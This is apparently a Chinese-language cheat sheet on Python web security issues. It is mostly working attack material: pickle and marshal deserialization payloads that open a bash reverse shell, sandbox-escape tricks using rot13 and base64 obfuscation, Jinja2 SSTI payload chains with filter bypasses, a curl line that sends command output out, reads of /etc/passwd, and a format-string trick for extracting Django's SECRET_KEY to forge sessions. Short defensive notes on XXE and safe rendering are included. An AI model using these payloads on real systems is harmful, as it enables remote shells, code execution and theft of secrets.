# python web 常见安全问题

## 0x01反序列化

json、pickle/cPickle,marshal，shelve，yaml


```
#!/usr/bin/env python
# encoding: utf-8
import os
import pickle
class test(object):
    def __reduce__(self):
        code='bash -c "bash -i >& /dev/tcp/127.0.0.1/12345 0<&1 2>&1"'
        return (os.system,(code,))
a=test()
c=pickle.dumps(a)
print c
pickle.loads(c)

```
构造的关键就是__reduce__函数，这个魔术方法的作用根据上面的文档简单总结如下：

    如果返回值是一个字符串，那么将会去当前作用域中查找字符串值对应名字的对象，将其序列化之后返回，例如最后return 'a',那么它就会在当前的作用域中寻找名为a的对象然后返回，否则报错。
    如果返回值是一个元组，要求是2到5个参数，第一个参数是可调用的对象，第二个是该对象所需的参数元组，剩下三个可选。所以比如最后return (eval,("os.system('ls')",))，那么就是执行eval函数，然后元组内的值作为参数，从而达到执行命令或代码的目的，当然也可以return (os.system,('ls',))。

pickle.loads对于未引入的module会自动尝试import。导致整个python标准库的代码执行。然而pickle不能序列化code对象，幸运的是从python2.6开始marshal模块支持code对象的序列化。
因此构造payload如下

```
import base64
import marshal

def foo():
    import os
    os.system('bash -c "bash -i >& /dev/tcp/127.0.0.1/12345 0<&1 2>&1"')

payload="""ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR."""%base64.b64encode(marshal.dumps(foo.func_code))

pickle.loads(payload)

payload="""ctypes
FunctionType
(cmarshal
loads
(S'%s'
tRc__builtin__
globals
(tRS''
tR(tR."""%marshal.dumps(foo.func_code).encode('string-escape')

pickle.loads(payload)

```


```
import base64
import marshal

def foo():
    import os
    os.system('bash -c "bash -i >& /dev/tcp/127.0.0.1/12345 0<&1 2>&1"')

payload="""cnew
function
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR."""%base64.b64encode(marshal.dumps(foo.func_code))

pickle.loads(payload)

payload="""cnew
function
(cmarshal
loads
(S'%s'
tRc__builtin__
globals
(tRS''
tR(tR."""%marshal.dumps(foo.func_code).encode('string-escape')

pickle.loads(payload)

```

    c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。
    (：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。
    t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。
    S：读取引号中的字符串直到换行符处，然后将它压入堆栈。
    R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
    .：结束pickle。

适用于python2 的input方法

```
c__builtin__
setattr
(c__builtin__
__import__
(S'sys'
tRS'stdin'
cStringIO
StringIO
(S'__import__('os').system(\'curl 127.0.0.1:12345\')'
tRtRc__builtin__
input
(S'input: '
tR.
直接反弹shell就行了
a='''c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S'sys'\ntRS'stdin'\ncStringIO\nStringIO\n(S'__import__('os').system('bash -c "bash -i >& /dev/tcp/127.0.0.1/12345 0<&1 2>&1"')'\ntRtRc__builtin__\ninput\n(S'python> '\ntR.'''

pickle.loads(a)
```



## 0x02沙箱绕过


### 使用常用模块

```
os.system('ifconfig')
os.popen('ifconfig')
commands.getoutput('ifconfig')
commands.getstatusoutput('ifconfig')
subprocess.call(['ifconfig'],shell=True)
open()
file()
eval,exec,execfile

```


> 其中，这个subprocess中的shell参数phithon师傅在小密圈以前专门提到过 如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法。

> [os模块其他方法](https://docs.python.org/2/library/os.html)

> 对于python的文件操作，我们常用的open()和file()，用法差不多，不过python3已经移除了file函数

### 使用反序列化模块

pickle Cpickle等

### 使用types和timeit模块

- timeit模块

timeit.timeit等

[timeit](https://docs.python.org/2/library/timeit.html)

- types模块


### 字符串修饰符f

python3.6引入的一个字符串修饰符f，即f-strings，这个比较有意思了，能实现的效果基本和format差不太多，同样可以用来进行命令执行

```
f"{__import__('os').system('ls')}"

```

### 编码绕过正则或关键词检测

```
eval('xxxxxx'.decode('base64'))
```

```
s = "emit"
s = s [::-1]
print a[s]

```

### 使用__import__ importlib

```
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')

or:

import importlib
f3ck = importlib.import_module("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
```

### 绕过内置函数被禁（鸡肋）

```
import imp
imp.reload(__builtin__)

or

imp.load_module(__builtin__)
```

> 上述方法能够生效的前提是，在最开始有这样的程序语句import __builtin__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。


> 以Python 2.7为例，__builtin__模块和__builtins__模块的作用在很多情况下是相同的。
但是，在Python 3+中，__builtin__模块被命名为builtins。
所以，在3中python需要将2中的名称改为builtins,同时添加import builtins



### 不引入直接执行

```
>>> execfile('/usr/lib/python2.7/os.py')
>>> system('cat /etc/passwd')

```

如果execfile函数被禁止,那么还可以使用文件操作打开相应文件然后读入,使用exec来执行代码就可以

### dir dict 辅助

```
>>> A.__dict__
mappingproxy({'b': 'asdas', '__dict__': <attribute '__dict__' of 'A' objects>, 'a': 1, '__doc__': None, '__weakref__': <attribute '__weakref__' of 'A' objects>, 'c': <function A.c at 0x7f18ea25e510>, '__module__': '__main__'})
>>> dir(A)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'a', 'b', 'c']


```
获取当前已经引入的模块

```
>>> main_module = sys.modules[__name__]
>>> dir(main_module)
['A', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'codecs', 'fuck', 'inspect', 'main_module', 'os', 'reprlib', 'sys', 'this']
```

可以看到已定义的全部的函数和变量,已经引入的模块和类



### getattr 辅助绕过对方法的过滤

getattr + codecs 绕过对方法的过滤

```
>>> import codecs
>>> import os
>>> getattr(os,codecs.encode('flfgrz','rot13'))('whoami')
desktop-4bstar8\sn
```

### func_code 辅助

一个系统中的包(自带的和通过pip,ea可以使用easy_install安装的),可以使用inspect模块中的方法可以获取其源码

但是,如果是项目中的函数,一旦加载到了内存之中,就不再以源码的形式存在了,而是以字节码的形式存在了,如果我们想要知道这些函数中的一些细节怎么办呢?这个时候就需要用到函数中的一个特殊属性:func_code
``` python3 __code__ ```

### mro subclasses 辅助

父子类 ssti中给出详细示例

### 伪private属性

在一个类中,以双下划线开头的函数和属性是Private的,但是这种Private并不是真正的,而只是形式上的,用于告诉程序员,这个函数不应该在本类之外的地方进行访问,而是否遵守则取决于程序员的实现
```

In [85]: class A():
    ...:     __a = 1
    ...:     b = 2
    ...:     def __c(self):
    ...:         print "asd"
    ...:     def d(self):
    ...:         print 'dsa'
    ...:         

In [86]: A
Out[86]: <class __main__.A at 0x7fc3444048d8>

In [87]: dir(A)
Out[87]: ['_A__a', '_A__c', '__doc__', '__module__', 'b', 'd']
```



## 0x03Sql注入

因sqlalchemy等orm框架的使用，pythonweb中较少

## 0x04XSS

1.动态属性
```
<img alt={{foo}}

```
2.mark_safe函数与autoescape标签滥用

3.domxss

4.httpresponse返回动态内容

## 0x05XXE

lxml模块使用的xmlparse使用libxml<2.9 导致xxe

xml.dom.mindom 或 xml.etree.ElementTree 不受影响

防御：

```
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
```

## 0x06SSTI


payload:
```
python2：
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')
"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[40](filename).read()
"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')



python3：
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']
"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']


jinja2下的给一个poc：

request.__class__.__mro__[8].__subclasses__()[40]


```
寻找os类 eval方法 call方法 ```__import__```:

```
#!/usr/bin/env python
# encoding: utf-8

cnt=0
for item in [].__class__.__base__.__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print cnt,item
        cnt+=1
    except:
        print "error",cnt,item
        cnt+=1
        continue


```
```
#!/usr/bin/env python
# encoding: utf-8

cnt=0
for item in "".__class__.__mro__[-1].__subclasses__():
    try:
        cnt2=0
        for i in item.__init__.__globals__:
            if 'eval' in item.__init__.__globals__[i]:
                print cnt,item,cnt2,i
            cnt2+=1
        cnt+=1
    except:
        print "error",cnt,item
        cnt+=1
        continue

```


以flask为例，如果是直接return render_template('home.html', url=request.args.get('p'))就基本不存在ssti了，render_template_string存在ssti,而django中的如果使用return render(request,'xxx.html',var)也基本是安全的。





python3 环境中寻找eval：

![findeval](https://upload.cc/i1/2019/09/19/FNkiTX.png)

构造payload:

```
>>> ''.__class__.__mro__[-1].__subclasses__()[177].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
```

#### bypass


- bypass ```[]```:

使用getitem pop 方法 bypass

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
```

- bypass 引号

方法1：利用chr函数

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
```

方法2：利用request
```
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

- bypass ```双下划线__```

```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

- bypass {{
  

可以利用{%%}标记

```
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

相当于盲命令执行，利用curl将执行结果带出来
如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来

```
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~test~{% endif %}

```


## 0x07格式化字符串+客户端session伪造

''.format()


以django为例：

```
{user.password}

{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

```
获取到key之后便可以导致客户端session的伪造

## 0x08其它

flask debug pin码泄露

ssrf 

csrf




## Refer

http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/

https://github.com/bit4woo/python_sec

https://p0sec.net/index.php/archives/120/


https://xz.aliyun.com/t/2289
